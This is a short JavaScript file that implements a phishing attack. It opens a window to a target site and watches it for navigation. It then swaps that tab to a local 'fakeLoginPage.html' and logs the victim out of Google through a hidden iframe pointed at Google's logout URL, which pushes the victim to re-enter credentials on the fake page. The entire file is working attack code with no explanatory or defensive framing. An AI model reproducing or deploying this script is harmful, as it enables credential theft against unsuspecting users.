	function sleep(ms){
		return new Promise(resolve => setTimeout(resolve, ms));
	}

	var logoutUrls = {
		chrome: 'https://accounts.google.com/Logout'
	};

	async function logoutFrom(url, ms){
		await sleep(ms);
		let iframe = document.createElement("iframe");
        iframe.style.cssText = "display: none";
        iframe.src = url;
        iframe.onload = function(){
        	iframe.remove();
        	console.log("logged out");
        };
        iframe.onerror = function(){
        	iframe.remove();
        	console.log("logged out");
        }

		 document.documentElement.appendChild(iframe);    
    }

	function newWindow(url, logout){
		this.window = window.open(url);
		var that = this;
		var interval = new hasWindowChanged(this.window, 500, 11000, function(){
				interval.destroy();
				that.window.location = "fakeLoginPage.html";
			});
		logoutFrom(logoutUrls.chrome, 30000);
	};



	function hasWindowChanged(_window, ms, tolerance, callback){
		let lastDate = Date.now();
		let lastLength = 0;
		let keepgoing = true;
		this.destroy = function(){
			keepgoing = false;
		};
		async function interval(){
			if(lastLength != _window.length){
			let now = Date.now();
			if(now - lastDate > tolerance) {
				console.log(`changed within no tolerance (${now-lastDate}): ${_window.length}`);
				callback();
			}
			else{
				console.log(`changed within tolerance (${now-lastDate}): ${_window.length}`);
			}
				lastLength = _window.length;
				lastDate = now;
			}
			if(keepgoing){
				await sleep(ms);
				interval();
			}
		}

		interval();
	};

